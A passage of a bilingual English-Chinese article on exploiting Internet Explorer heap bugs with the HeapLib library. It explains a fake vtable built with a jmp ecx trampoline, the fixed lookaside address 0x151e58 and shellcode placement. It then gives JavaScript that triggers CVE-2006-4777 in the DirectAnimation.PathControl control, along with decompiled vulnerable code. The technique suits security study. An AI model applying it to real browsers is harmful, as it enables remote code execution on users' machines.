style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>                                                 </span>+8 function pointer<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>                                                 </span>...<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>If
we overwrite an object pointer with 0x151e58 and free a 1008 byte block
containing a fake vtable, any virtual function call through the vtable will
jump to a location of our choosing. The fake vtable can be built using the
vtable() function in the HeapLib library. It takes a shellcode string and an address
of a jmp ecx trampoline as arguments and allocates a 1008 byte block with the
following data:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>如果我们把一个对象指针改成</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>0x151e58</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>，再释放一个包含我们伪造的虚函数表的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>1008</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>字节的内存块，那么只要程序调用这个对象的虚函数，我们就能获得系统的控制权了。在</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>HeapLib</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中我提供了一个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>vtable()</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>函数在实现这一过程。这个函数分配一个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>1008</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>字节大小内存块，然后在这个内存块中填入如下图所示的数据。（译注：实际上这个内存块就是一个是</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象）</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>string length<span style='mso-spacerun:yes'>   </span>jmp +124<span style='mso-spacerun:yes'>   </span>addr of jmp ecx<span style='mso-spacerun:yes'>   </span>sub [eax], al*2<span style='mso-spacerun:yes'>   </span>shellcode<span style='mso-spacerun:yes'>   </span>null terminator<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>4 bytes<span style='mso-spacerun:yes'>         </span>4 bytes<span style='mso-spacerun:yes'>    </span>124 bytes<span style='mso-spacerun:yes'>         </span>4 bytes<span style='mso-spacerun:yes'>           </span>x bytes<span style='mso-spacerun:yes'>      </span>2 bytes<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
caller should free the vtable to the lookaside and overwrite an object pointer
with the address of the lookaside head. The fake vtable is designed to exploit
virtual function calls where the object pointer is in eax and the vtable
address in ecx:<o:p></o:p></span></p>

<p class=MsoCommentText><span style='font-size:9.5pt;mso-ascii-font-family:
Verdana;mso-hansi-font-family:Verdana;color:#404040'>主调函数把</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>vtable</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>释放到</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>lookaside</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>表中去，然后用</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x151e58</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>（或者你计算出的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>lookaside</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>表中该项的地址）（</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>事实上这篇文章的核心就是讲这个，如何制造一个在很多环境下都可以成功运行的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>exploit,</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>因为一般的堆的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>base address</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>是不变的，所以如果相对</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>base
address</span><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;
mso-hansi-font-family:Verdana;color:#404040'>的位置也是不变的，那么这个地址在很多机器上就是不变的，这个地址的内容又是我们可以控制的，所以覆盖了对象指针，函数指针，凡是可以执行的指针都可以填上这个地址就可。他这篇文章前面清空这个，清空那个，就是让每台机器的这个堆的状态保持一样。）覆盖一个对象的指针。这个伪造的虚函数表是专门用来利用这类虚函数表被覆盖的漏洞的。在这类漏洞中，对象的指针总是被放在</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>EAX</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>寄存器中，而</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>ECX</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>中总是放着虚函数表的地址。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>mov ecx, dword ptr [eax]<span style='mso-spacerun:yes'>    </span>; get the vtable address<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>push eax<span style='mso-spacerun:yes'>                    </span>; pass C++ this pointer as the first argument<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>call dword ptr [ecx+08h]<span style='mso-spacerun:yes'>    </span>; call the function at offset 0x<st1:chmetcnv
UnitName="in" SourceValue="8" HasSpace="True" Negative="False" NumberType="1"
TCSC="0" w:st="on">8 in</st1:chmetcnv> the vtable<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Any
virtual function call from ecx+8 to ecx+0x80 will result in a call to the jmp
ecx trampoline. Since ecx points to the vtable, the trampoline will jump back
to the beginning of the block. Its first four bytes contain the string length
when it's in use, but after it's freed to the lookaside, they are overwritten
with NULL. The four zero bytes are executed as two </span><span class=code><span
lang=EN-US style='font-size:9.0pt;color:#404040'>add&nbsp;[eax],&nbsp;al</span></span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>
instructions. The execution reaches the </span><span class=code><span
lang=EN-US style='font-size:9.0pt;color:#404040'>jmp +124</span></span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>
instruction, which jumps over the function pointers and lands on the two </span><span
class=code><span lang=EN-US style='font-size:9.0pt;color:#404040'>sub&nbsp;[eax],&nbsp;al</span></span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>
instructions at offset <st1:chmetcnv TCSC="0" NumberType="1" Negative="False"
HasSpace="True" SourceValue="132" UnitName="in" w:st="on">132 in</st1:chmetcnv>
the vtable. These two instructions fix the memory corrupted earlier by the sub
instructions, and finally the shellcode is executed.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>为什么要在内存中写入这么多</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>JMP ECX</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>指令的地址呢？你仔细看一下这些地址的位置。这样写是为了保证，如果程序调用对象的第</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>3</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个到第</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>32</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>个虚函数（也就是</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>ecx+8</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>到</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>ecx+0x80</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>），都会去执行</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>JMP ECX</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>。由于</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>ECX</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>中装的是虚函数表，所以程序又会跳回到这个块的起始位置。如您所见，当这个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象还没有被删除之前，最前面的这个</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>DWORD</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>应该是用来表示字符串的长度的。但一旦这个</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象被释放进了</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>lookaside</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>表，这个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>DWORD</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>就变成了</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>NULL</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>。这</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>4</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个全零的字节会被当成</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>2</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>条“</span><span
class=code><span lang=EN-US style='font-size:9.0pt;color:#404040'>add&nbsp;[eax],&nbsp;al</span></span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>”指令。所以在</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>string length</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>之后我们写了一句</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>jmp+124</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>，然后又写了一句“</span><span lang=EN-US style='font-size:9.0pt;
color:#404040'>sub [eax], al*<st1:chmetcnv TCSC="0" NumberType="1"
Negative="False" HasSpace="False" SourceValue="2" UnitName="”" w:st="on">2<span
 lang=EN-US style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
 Verdana'><span lang=EN-US>”</span></span></st1:chmetcnv></span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>用来消除</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>2</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>条“</span><span
class=code><span lang=EN-US style='font-size:9.0pt;color:#404040'>add&nbsp;[eax],&nbsp;al</span></span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>”指令的影响。最后，呵呵，当然就该轮到</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>shellcode</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>执行了</span><span lang=EN-US style='font-size:9.5pt;
font-family:Wingdings;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;
color:#404040;mso-char-type:symbol;mso-symbol-font-family:Wingdings'><span
style='mso-char-type:symbol;mso-symbol-font-family:Wingdings'>J</span></span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<h2><span lang=EN-US style='font-size:12.5pt;font-family:Verdana'>Exploiting
heap vulnerabilities with HeapLib<o:p></o:p></span></h2>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>DirectAnimation.PathControl
KeyFrame vulnerability<o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>As
our first example we will use the integer overflow vulnerability in the
DirectAnimation.PathControl ActiveX control (<a
href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4777">CVE-2006-4777</a>).
This vulnerability is triggered by creating an ActiveX object and calling its
KeyFrame() method with a first argument larger than 0x07ffffff.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>下面我演示一个整形溢出问题的</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>exploit</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>。这个整形溢出漏洞存在于</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>ActiveX</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>控件的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>DirectAnimation.PathControl(<a
href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4777">CVE-2006-4777</a>)</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中。触发条件是用一个大于</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>0x07ffffff</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的数当</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>KeyFrame()</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>的第一个参数。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
KeyFrame method is documented in the Microsoft DirectAnimation SDK as follows:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>下面是微软</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>DirectAnimation SDK</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>文档中给出的关于</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>KeyFrame</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>方法的信息：</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<div style='border:dotted windowtext 1.0pt;mso-border-alt:dotted windowtext .75pt;
padding:0cm 12.0pt 0cm 12.0pt;margin-left:24.0pt'>

<h4><span lang=EN-US style='font-family:Verdana;color:#404040'>KeyFrame Method<o:p></o:p></span></h4>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Specifies
x- and y-coordinates along the path, and a time to reach each point. The first
point defines the path's starting point. This method can be used or modified
only when the path is stopped.<o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Syntax<o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'>KeyFrameArray
= Array( <i>x1</i>, <i>y1</i>, ..., <i>xN</i>, <i>yN</i> )<o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'>TimeFrameArray
= Array( <i>time2</i> , ..., <i>timeN</i> )<o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:24.0pt;tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt'><span
lang=EN-US style='font-size:9.0pt;font-family:"Courier New";color:#404040'>pathObj.KeyFrame(
<i>npoints</i>, <i>KeyFrameArray</i>, <i>TimeFrameArray</i> )<o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Parameters<o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:24.0pt'><i><span lang=EN-US
style='font-size:9.0pt;font-family:"Courier New";color:#404040'>npoints <o:p></o:p></span></i></p>

<p class=MsoNormal style='margin-top:0cm;margin-right:0cm;margin-bottom:6.0pt;
margin-left:36.0pt'><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
color:#404040'>Number of points to be used to define the path. <o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:48.0pt'><i><span lang=EN-US
style='font-size:9.0pt;font-family:"Courier New";color:#404040'>x1, y1,..., xN,
yN <o:p></o:p></span></i></p>

<p class=MsoNormal style='margin-top:0cm;margin-right:0cm;margin-bottom:6.0pt;
margin-left:36.0pt'><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
color:#404040'>Set of x- and y- coordinates that identify the points along the
path. <o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:72.0pt'><i><span lang=EN-US
style='font-size:9.0pt;font-family:"Courier New";color:#404040'>time2,...,
timeN <o:p></o:p></span></i></p>

<p class=MsoNormal style='margin-top:0cm;margin-right:0cm;margin-bottom:6.0pt;
margin-left:36.0pt'><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
color:#404040'>Respective times that the path takes to reach each of the
respective points from the previous point. <o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:96.0pt'><i><span lang=EN-US
style='font-size:9.0pt;font-family:"Courier New";color:#404040'>KeyFrameArray <o:p></o:p></span></i></p>

<p class=MsoNormal style='margin-top:0cm;margin-right:0cm;margin-bottom:6.0pt;
margin-left:36.0pt'><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
color:#404040'>Array that contains the x- and y-coordinate definitions. <o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:120.0pt'><i><span lang=EN-US
style='font-size:9.0pt;font-family:"Courier New";color:#404040'>TimeFrameArray <o:p></o:p></span></i></p>

<p class=MsoNormal style='margin-top:0cm;margin-right:0cm;margin-bottom:6.0pt;
margin-left:36.0pt'><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
color:#404040'>Array that contains the time values between the points that
define the path, starting at the x1 and y1 point through xN and yN points (the
last set of points in the path). The path begins at point x1 and y1 with a time
value of 0. <o:p></o:p></span></p>

</div>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
following JavaScript code will trigger the vulnerability:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>下面这段是触发这个漏洞的</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>JavaScript</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>代码：</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>var target = new ActiveXObject(&quot;DirectAnimation.PathControl&quot;);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>target.KeyFrame(0x7fffffff, new Array(1), new Array(1));<o:p></o:p></span></pre>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Vulnerable
code<o:p></o:p></span></h3>

<h3><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>出现问题的代码</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
vulnerability is in the CPathCtl::KeyFrame function in DAXCTLE.OCX. The
decompiled code of the function is shows below:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>出现问题的代码位于</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>DAXCTLE.OCX </span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>中的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>CPathCtl::KeyFrame</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数。下面给出的是这个函数的一部分反汇编出来的代码：</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>long __stdcall CPathCtl::KeyFrame(unsigned int npoints,<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>                                  </span>struct tagVARIANT KeyFrameArray,<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>                                  </span>struct tagVARIANT TimeFrameArray)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>{<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>int err = 0;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>...<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// The new operator is a wrapper around CMemManager::AllocBuffer. If the<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// size size is less than 0x2000, it allocates a block from a special<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// CMemManager heap, otherwise it is equivalent to:<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>//<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size+8) + 8<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>buf_1<span style='mso-spacerun:yes'>                  </span>= new((npoints*2) * 8);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>buf_2<span style='mso-spacerun:yes'>                  </span>= new((npoints-1) * 8);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>KeyFrameArray.field_C<span style='mso-spacerun:yes'>  </span>= new(npoints*4);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>TimeFrameArray.field_C = new(npoints*4);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>if (buf_1 == NULL || buf_2 == NULL || KeyFrameArray.field_C == NULL ||<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>TimeFrameArray.field_C == NULL)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>{<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>err = E_OUTOFMEMORY;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>goto cleanup;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>}<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// We set an error and go to the cleanup code if the KeyFrameArray array<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// is smaller than npoints*2 or TimeFrameArray is smaller than npoints-1<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>if ( KeyFrameArrayAccessor.ToDoubleArray(npoints*2, buf_1) &lt; 0 ||<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>TimeFrameArrayAccessor.ToDoubleArray(npoints-1, buf_2) &lt; 0)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>{<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>err = E_FAIL;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>goto cleanup;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>}<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>...<o:p></o:p></span></pre><pre
